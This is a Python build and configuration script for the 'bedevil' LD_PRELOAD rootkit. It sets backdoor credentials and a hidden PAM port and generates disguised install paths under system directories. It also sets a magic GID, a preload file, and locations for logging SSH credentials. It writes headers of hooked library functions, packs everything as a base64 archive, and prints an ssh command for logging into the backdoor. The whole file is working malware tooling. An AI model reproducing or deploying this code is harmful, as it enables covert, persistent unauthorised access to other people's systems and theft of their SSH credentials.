#!/usr/bin/env python


# SETTINGS

# if you would like any of these credentials to have random values just set them to 'None'.
# they get shown to you beforehand anyway.
BD_UNAME = 'changeme'
BD_PWD   = 'changeme'
PAM_PORT = 13337

# END OF SETTINGS






from crypt import crypt
from shutil import copytree, copy
from base64 import b64encode
from string import ascii_uppercase, ascii_lowercase, digits
from random import choice
from os import listdir, system
from os.path import join, basename

USED_PATHS = [] # 'random' paths we've already got.

def randgarb(garbset, garblen):
    garb = ''.join(choice(garbset) for _ in range(garblen))
    return garb

def randpath(maxlen):
    rootdirs = ['/usr', '/etc', '/lib']
    randroot = choice(rootdirs)
    randdir = choice(listdir(randroot))

    while len(randdir) < maxlen:
        randdir += randgarb(ascii_lowercase, 1)

    while len(randdir) > maxlen:
        randdir = randdir[:-1]

    suffix = randgarb(ascii_lowercase, 3)
    newpath = '{0}/{1}{2}'.format(randroot, randdir, suffix)
    if newpath in USED_PATHS or '.' in newpath:
        newpath = randpath(maxlen)
    USED_PATHS.append(newpath)
    return newpath

PRELOAD_FILE = randpath(10)

if BD_UNAME == None:
    BD_UNAME = randgarb(ascii_lowercase, 7)
if BD_PWD == None:
    BD_PWD = randgarb(ascii_lowercase+ascii_uppercase+digits, 9)
if PAM_PORT == None:
    PAM_PORT = choice(range(11111, 63556))

print('Username: ' + BD_UNAME)
print('Password: ' + BD_PWD)
print('Hidden port: ' + str(PAM_PORT))

BD_PWD = crypt(BD_PWD, "$6$"+randgarb(ascii_lowercase+ascii_uppercase+digits, 16))

MAGIC_GID = randgarb(digits.replace('0',''), 6)
GID_PATH = randpath(5)
GIDTIME_PATH = randpath(5)
BD_VAR = randgarb(ascii_uppercase, 9)
#print('Magic GID: ' + str(MAGIC_GID))
#print('Magic environment variable: ' + BD_VAR)

INSTALL_DIR = randpath(7)
BDVLSO = 'lib' + basename(INSTALL_DIR) + '.so'
SOPATH = '{0}/{1}.$PLATFORM'.format(INSTALL_DIR, BDVLSO)
print('Install directory: ' + INSTALL_DIR)
#print('bdvl SO: ' + BDVLSO)
#print('SO path: ' + SOPATH)

HIDEPORTS = randpath(7)
SSH_LOGS = randpath(7)
INTEREST_DIR = randpath(7)
SSHD_CONFIG = randpath(7)

INC = 'inc'
NEW_INC = 'new_inc'

BDVLH = NEW_INC + '/bedevil.h'

DEFAULTS = [BD_UNAME, BD_PWD, int(MAGIC_GID), BD_VAR, INSTALL_DIR,
            BDVLSO, SOPATH, PRELOAD_FILE, SSH_LOGS, INTEREST_DIR,
            HIDEPORTS, GID_PATH, GIDTIME_PATH, int(PAM_PORT), SSHD_CONFIG]
DEF_NAMES = ['BD_UNAME', 'BD_PWD', 'MAGIC_GID', 'BD_VAR', 'INSTALL_DIR',
             'BDVLSO', 'SOPATH', 'PRELOAD_FILE', 'SSH_LOGS', 'INTEREST_DIR',
             'HIDEPORTS', 'GID_PATH', 'GIDTIME_PATH', 'PAM_PORT', 'SSHD_CONFIG']

# stores all names of hooked funcs
ALL_HOOKS = []


class Definitions():
    def __init__(self, alist):
        self.array_list = alist
        self.list_len = len(alist)

    # for constant strings...
    def getcdef(self, name, val):
        c_def = '#define {0} "{1}"\n'
        c_def = c_def.format(name, val)
        return c_def

    # or literally anything else.
    def getidef(self, name, val):
        c_def = '#define {0} {1}\n'
        c_def = c_def.format(name, val)
        return c_def

    # creates a bunch of string definitions based on data
    # in target array. not used & not needed, but kept.
    def getdefs(self):
        all_defs = ''
        for i in range(self.list_len):
            our_name = self.array_list[i][0]
            our_value = self.array_list[i][1]

            this_def = self.gettcdef(our_name, our_value)
            all_defs += this_def
        return all_defs

    # returns a new identifier definition based on name & index.
    # where index is the current index of the target array.
    def getident(self, nam, index):
        # remove prefixed 'X' & underscores. ideally these
        # names should be much shorter.
        rlnam = nam.upper()
        ident = '#define C{0} {1}\n'
        ident = ident.format(rlnam, str(index))
        return ident

    # gets all identifiers for data in the target array
    # using self.getident for each element. used for referencing
    # data, encrypted & plain from the rootkit & installer respectively.
    def getidents(self):
        idents = ''
        for i in range(self.list_len):
            our_name = self.array_list[i]
            idents += self.getident(our_name, i)
        return idents


# handy class. trusty class. thank you class.
class CArray():
    def __init__(self, name, sizedef, alist):
        self.array_name = name
        self.size_name = sizedef
        self.list_len = len(alist)
        self.array_list = alist

    # define size of the array to be created.
    def getsizedef(self):
        size_def = '#define {0} {1}\n'
        size_def = size_def.format(self.size_name, self.list_len)
        return size_def

    # setup the beginning of the array.
    def declarearr(self):
        declaration = 'static char *const {0}[{1}] = '
        declaration = declaration.format(self.array_name, self.size_name)
        return declaration

    # build elements of target array.
    def buildelems(self, elems='{'):
        for elem in self.array_list:  # each element is already xor'd.
            elems += '"{0}",'.format(elem)
        elems = elems[:-1]  # remove trailing comma.
        elems += '};\n'
        return elems

    # create full C array.
    def create(self):
        result = self.getsizedef()
        result += self.declarearr()
        result += self.buildelems()
        return result



def write_hooks():
    #print('Writing hooked function names')
    hookspath = NEW_INC + '/hooks/libdl/hooks'

    fd = open(hookspath, 'r')
    contents = fd.read().split('\n')
    fd.close()

    allhooks = ''
    for line in contents:
        if len(line) == 0 or line[0] == '#':
            continue

        curtoks = line.split(':')
        
        targetlib = curtoks[0]
        targetsyms = curtoks[1]
        hooktoks = targetsyms.split(',')

        for curhook in hooktoks:
            ALL_HOOKS.append(curhook)

        newarr = CArray(targetlib, targetlib.upper()+'_SIZE', hooktoks)
        allhooks += newarr.create()

    fd = open(BDVLH, 'a')
    fd.write(allhooks)
    fd.close()
    #print('Finished writing hooks')


def findallheaders():
    includeh = NEW_INC + '/includes.h'
    fd = open(includeh, 'r')
    contents = fd.read().split('\n')
    fd.close()

    gotheaders = []
    for line in contents:
        if not '#include' in line[:8]:
            continue

        line = line.split('"')[1]
        actualpath = NEW_INC + '/' + line

        fd = open(actualpath, 'r')
        if not '??' in fd.read():
            fd.close()
            continue
        fd.close()

        gotheaders.append(actualpath)
        #print(actualpath)
    return gotheaders



def writebdvlh(buf):
    fd = open(BDVLH, 'a')
    fd.write(buf)
    fd.close()

def setup_config(): # every step chronologically
    copytree(INC, NEW_INC)
    write_hooks()

    gotbdvlh = ''
    for placeholderi in range(len(DEFAULTS)):
        target = DEF_NAMES[placeholderi]
        value = DEFAULTS[placeholderi]

        targettok = target.split('_')
        for tok in targettok:
            if tok == 'PORT':
                fd = open(NEW_INC+'/hideports', 'a+')
                fd.write(str(value)+'\n')
                fd.close()

        try:
            gotbdvlh += '#define {0} \"'.format(target) + value + '\"\n'
        except:
            gotbdvlh += '#define {0} {1}\n'.format(target, str(value))
    gotbdvlh += '#define ASS_PATH INSTALL_DIR\"/my_ass\"\n'
    defs = Definitions(ALL_HOOKS)
    gotbdvlh += defs.getidents()

    allhooksarr = CArray('all', 'ALL_SIZE', ALL_HOOKS)
    gotbdvlh += allhooksarr.create()
    gotbdvlh += 'syms symbols[ALL_SIZE];\n'
    writebdvlh(gotbdvlh)

    copy('etc/.rolf', NEW_INC+'/.rolf')
    copy('etc/.bashrc', NEW_INC+'/.bashrc')

    fd = open(NEW_INC+'/magic_gid', 'w')
    fd.write(str(MAGIC_GID))
    fd.close()

    settcfg = str(MAGIC_GID)+'\n'
    settcfg += INSTALL_DIR+'\n'
    settcfg += PRELOAD_FILE+'\n'
    settcfg += BDVLSO+'\n'
    settcfg += SOPATH+'\n'
    settcfg += HIDEPORTS+'\n'
    settcfg += SSH_LOGS+'\n'
    settcfg += INTEREST_DIR+'\n'
    settcfg += BD_VAR+'\n'
    settcfg += GID_PATH+'\n'
    settcfg += GIDTIME_PATH+'\n'
    fd = open(NEW_INC+'/settings.cfg', 'w')
    fd.write(settcfg)
    fd.close()

    system('tar cpfz {0}.tar.gz {0}'.format(NEW_INC))
    fd = open(NEW_INC+'.tar.gz', 'r')
    targzb64 = b64encode(fd.read())
    fd.close()
    
    fd = open(NEW_INC+'.b64', 'w')
    fd.write(targzb64)
    fd.close()




if __name__ == '__main__':
    setup_config()
    print('\tsh etc/ssh.sh {0} <host> {1}'.format(BD_UNAME, str(PAM_PORT)))
